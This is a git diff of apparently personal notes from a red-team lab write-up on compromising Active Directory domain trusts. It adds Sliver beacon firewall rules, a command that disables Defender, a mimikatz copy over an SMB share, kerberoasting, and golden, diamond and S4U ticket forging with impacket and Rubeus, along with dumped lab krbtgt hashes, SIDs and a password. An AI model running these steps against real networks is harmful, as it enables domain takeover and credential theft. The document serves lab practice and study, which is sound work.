@@ -809,7 +809,7 @@ I wondered why I could download from the DC and then I guessed someone before me
 ```powershell
 netsh advfirewall firewall add rule name= "Open Port 8443" dir=in action=allow protocol=TCP localport=8443
 netsh advfirewall firewall add rule name= "Open Port 8443" dir=out action=allow protocol=TCP localport=8443
-netsh advfirewall firewall add rule name="nvm-the-beacon" dir=in action=allow program="C:\Users\Administrator\Desktop\Word.exe" enable=yes
+netsh advfirewall firewall add rule name="nvm-the-beacon" dir=in action=allow program="C:\Word.exe" enable=yes
 ```
 
 On the DC , I understand this is not Opsec safe, but I want flags and I have time constraints
@@ -843,11 +843,10 @@ net user NVM2 /dom
 gpupdate /force
 ```
 
-
 The horror...
 ![](powerlevelisover9000.png)
 
-In the face of this I want to also make:
+In the face BadOpsec of this I want to also make:
 - Silver Tickets
 - Golden Tickets
 - Golden Certs if time.
@@ -922,21 +921,23 @@ DC has fallen
 
 #### Golden Tickets with Tyler
 
+Domain Trust Exploitation
+
 [Tyler](https://www.youtube.com/watch?v=Td_Krk1S3yg) did:
 ```powershell
 proxychains4 xfreerdp /u:NVM2 /p:'p@ssw0rd1!' /v:10.200.117.102
 Set-MpPreference -DisableRealTimeMonitoring $true
-
+impacket-smbserver share $(pwd) -smb2support
+xcopy \\10.50.114.111\Share\mimikatz.exe .
+# And kerberoasted and Exploit the domain trust.
 ```
 
-I have a sliver beacon on the DC with some serious capabilities
+I have a sliver beacon on the DC with some serious capabilities so I tried various including the below
 ```go
 // Smoother install
 armory install -t 30 -c all  
 // Inventory check
 armory
-
-
 
 c2tc-kerberoast roast *
 // There is a svcEDR account which would be cool to try to be
@@ -947,15 +948,91 @@ sa-adcs-enum // Save in data sa-adcs-enum.out
 remote-adcs-request [flags] CA [template] [subject] [alt-name] [Install] [Machine]
 ```
 
+#### Alh4zr3d's Try Harder Tuesday
+
+[Alh4zr3d](https://www.twitch.tv/videos/1833475098)
+
+Domain Trust Typology:
+- Inbound - Domain A  is trusted by Domain B (Domain A gains access to resources in B) 
+- Outbound - Domain A trust is outbound to another Domain B (Domain B gains access to resources in A) 
+- Bidirectional - Both Domains A and B trust one another both gains access to resources in each other 
+- [Transitive](https://learn.microsoft.com/en-us/azure/active-directory-domain-services/concepts-forest-trust) - *"Transitivity determines whether a trust can be extended outside of the two domains with which it was formed.
+	- *A transitive trust can be used to extend trust relationships with other domains.*
+	- *A non-transitive trust can be used to deny trust relationships with other domains.*"
+
+By default when setting up a parent child domain there is a bidirectional.
+
+[Diamond Tickets](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/diamond-ticket) are forged online, which is good for stealth legitimate traffic in logical timeline. 
+- Requires krbtgt hash.
+1. Request regular user TGT
+2. Decrypt
+3. Modify 
+
+Golden Tickets for a DC out of nowhere it any EDR - like Crowd   Strike definitely alerts on it.  
+
+[Sapphire tickets](https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/sapphire) 
+
+IoC: `wmic` mounts and writes output to `ADMIN$` share by default.
+```bash
+# Choose a share and does not execute cmd.exe with no output
+-share $SHARE -silentcommand
 ```
 
+
+```
+proxychains4 python3 /opt/BloodHound.py/bloodhound.py --dns-tcp -c all -d corp.thereserve.loc -ns 10.200.117.102 -u 'NVM2' -p 'p@ssw0rd1!'
 ```
 
 
+How to traverse a Bidirectional trust.
+![](bidreictionaltrust.png)
+
+```powershell
+Get-ADGroup -Identity "Enterprise Admins" -Server rootdc.thereserve.loc
+```
+
+```powershell
+# Domain SID for THERESERVE.LOC
+S-1-5-21-1255581842-1300659601-3764024703
+# Domain SID for CORP.THERESERVE.LOC
+S-1-5-21-170228521-1485475711-3199862024
+# Enterprise Admins SID
+S-1-5-21-1255581842-1300659601-3764024703-519
+# This most "normal" krbtgt hash
+dcsync-dump.hashes.ntds.kerberos:krbtgt:aes256-cts-hmac-sha1-96:899f996a627a04466da18a4c09d0d7e9a26edf5667518ee1af1e21df7e88e055
+dcsync-dump.hashes.ntds.kerberos:krbtgt:aes128-cts-hmac-sha1-96:7b3bb3c8cb4d2088bcf66834e1ee25d7
+dcsync-dump.hashes.ntds.kerberos:krbtgt:des-cbc-md5:4c7f49bc8c43ae5b
+dcsync-dump.hashes.ntds:krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0c757a3445acb94a654554f3ac529ede:::
+# Administrator Hash
+dcsync-dump.hashes.ntds:Administrator:500:aad3b435b51404eeaad3b435b51404ee:d3d4edcc015856e386074795aea86b3e
+
+ticketer.py -request -domain 'DOMAIN.FQDN' -user 'domain_user' -password 'password' -nthash 'krbtgt/service NT hash' -aesKey 'krbtgt/service AES key' -domain-sid 'S-1-5-21-...' -user-id '1337' -groups '512,513,518,519,520' 'baduser'
+
+# Exploit the SID history
+proxychains4 impacket-ticketer -request -domain 'CORP.THERESERVE.LOC' -user 'Administrator' -hashes 'd3d4edcc015856e386074795aea86b3e:d3d4edcc015856e386074795aea86b3e' -aesKey '899f996a627a04466da18a4c09d0d7e9a26edf5667518ee1af1e21df7e88e055' -nthash 0c757a3445acb94a654554f3ac529ede -domain-sid 'S-1-5-21-1255581842-1300659601-3764024703' -user-id '500' -groups '512,513,518,519,520' 'Administrator' -dc-ip 10.200.117.102 -extra-sid 'S-1-5-21-170228521-1485475711-3199862024-519'
+# PreAuth failed - possibly some hash value has been altered.
+
+.\Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:519
+```
+
+
+```go
+// Perform S4U constrained delegation abuse across domains:
+
+Rubeus.exe s4u /user:USER </rc4:HASH | /aes256:HASH> [/domain:DOMAIN] </impersonateuser:USER | /tgs:BASE64 | /tgs:FILE.KIRBI> /msdsspn:SERVICE/SERVER /targetdomain:DOMAIN.LOCAL /targetdc:DC.DOMAIN.LOCAL [/altservice:SERVICE] [/dc:DOMAIN_CONTROLLER] [/nowrap] [/self] [/nopac]
+```
+
+
+![](enterprisetargetadmins.png)
+
+[1:51](https://www.twitch.tv/videos/1833475098) 
+
+
+https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/diamond-ticket
+https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/diamond
 https://tishina.in/opsec/sliver-opsec-notes#implant%20obfuscation%20and%20export%20formats
 https://www.cybereason.com/blog/sliver-c2-leveraged-by-many-threat-actors
 https://0x00-0x00.github.io/research/2018/10/31/How-to-bypass-UAC-in-newer-Windows-versions.html
-
 
 ## Full Compromise of BANK Domain
 
